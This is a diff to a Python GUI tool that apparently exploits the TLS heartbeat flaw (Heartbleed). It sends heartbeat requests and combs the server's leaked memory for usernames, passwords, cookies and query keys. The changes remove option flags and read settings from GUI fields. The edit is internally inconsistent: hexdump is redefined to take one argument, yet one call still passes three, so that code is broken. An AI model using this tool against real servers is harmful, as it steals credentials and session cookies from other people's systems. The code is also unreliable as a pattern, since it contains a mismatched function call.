@@ -112,9 +112,10 @@ def getCredentials(info, key):
             i = info.index(key)
     return items
 
-def hexdump(s, key, verbose):
+def hexdump(s):
 
     file = FILE_text.get()
+    key = KEY_text.get()
 
     # Open output file (if specified by user)
     if len(file) > 0:
@@ -136,7 +137,7 @@ def hexdump(s, key, verbose):
         # Skip printing empty lines (lines that do not decode to useful information
         # If verbose option specified by user empty lines are printed
         _temp = pdat.replace('.','')
-        if len(_temp) > 0 or verbose:
+        if len(_temp) > 0:
             if len(file) > 0:
                 output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
             else:
@@ -196,7 +197,7 @@ def recvmsg(s):
     status.set(_tmp)
     return typ, ver, pay
 
-def hit_hb(s, file, pwd, cookie, key, verbose):
+def hit_hb(s, file, key):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
@@ -207,7 +208,7 @@ def hit_hb(s, file, pwd, cookie, key, verbose):
         if typ == 24:
             status.set('Received heartbeat response:')
             # Parse information from heartbeat response
-            users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay, file, key, verbose)
+            users, passwords, cookies, query, hasPwd, hasCookie = hexdump(pay)
 
             # Log to console the list of users
             logList(users[1:], 'USERS', colors.OKBLUE)
@@ -223,9 +224,9 @@ def hit_hb(s, file, pwd, cookie, key, verbose):
                 else:
                     status.set(colors.HEADER + 'QUERY (key): ' + colors.END + 'no results\n')
 
-            if hasCookie and cookie:
+            if hasCookie:
                 status.set(colors.HEADER + 'COOKIE: ' + colors.END + 'server returned cookies - check output')
-            if hasPwd and pwd:
+            if hasPwd:
                 status.set(colors.HEADER + 'PASSWORD: ' + colors.END + 'server returned passwords - check output')
 
             if len(pay) > 3:
@@ -237,7 +238,7 @@ def hit_hb(s, file, pwd, cookie, key, verbose):
 
         if typ == 21:
             status.set('Received alert:')
-            hexdump(pay, file, key, verbose)
+            hexdump(pay, file, key)
             status.set(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable')
             return False
 
@@ -283,7 +284,7 @@ def execute():
       status.set(_tmp)
       sys.stdout.flush()
       s.send(hb)
-      hit_hb(s, FILE, opts.pwd, opts.cookie, KEY, opts.verbose)
+      hit_hb(s, FILE, KEY)
 
 # ****************  GUI starts here *******************
 
